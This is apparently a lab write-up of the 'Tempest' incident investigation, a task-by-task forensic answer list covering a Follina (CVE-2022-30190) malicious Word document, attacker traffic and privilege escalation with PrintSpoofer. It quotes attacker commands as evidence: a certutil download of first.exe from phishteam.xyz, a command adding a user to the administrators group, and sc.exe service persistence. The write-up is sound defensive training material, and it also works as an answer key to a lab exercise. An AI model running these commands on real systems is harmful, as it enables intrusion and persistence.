# Tempest Incident Investigation

## Task 1 – Introduction

Brief explanation of the investigation.

---

## Task 2 – Preparation: Log Analysis

Describe the files analyzed:
- capture.pcapng
- sysmon.evtx
- windows.evtx

---

## Task 3 – Preparation: Tools and Artifacts

Tools used:

- Wireshark
- Event Viewer
- PowerShell
- VirusTotal

---

## Task 4 – Initial Access – Malicious Document

Malicious file discovered:

free_magicules.doc

User:

TEMPEST\benimaru

Application used:

Microsoft Word

Exploit triggered:

CVE-2022-30190 (Follina)

---

## Task 5 – Initial Access – Stage 2 Execution

Payload downloaded with:

certutil -urlcache -split -f http://phishteam.xyz/02dcf07/first.exe

Downloaded file:

first.exe

---

## Task 6 – Initial Access – Malicious Document Traffic

Suspicious traffic observed to:

167.71.199.191

Domain:

phishteam.xyz

---

## Task 7 – Discovery – Internal Reconnaissance

Command executed:

netstat -ano -p tcp

Suspicious listening port discovered:

5985

This port corresponds to **Windows Remote Management (WinRM)**.

---

## Task 8 – Privilege Escalation – Exploiting Privileges

Privilege identified:

SeImpersonatePrivilege

Tool used:

PrintSpoofer

Hash:

8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d

---

## Task 9 – Actions on Objective – Fully Owned Machine

New users created:

shuna  
shion

User added to administrators group:

net1 localgroup administrators /add shion

Persistence established using:

sc.exe create TempestUpdate2
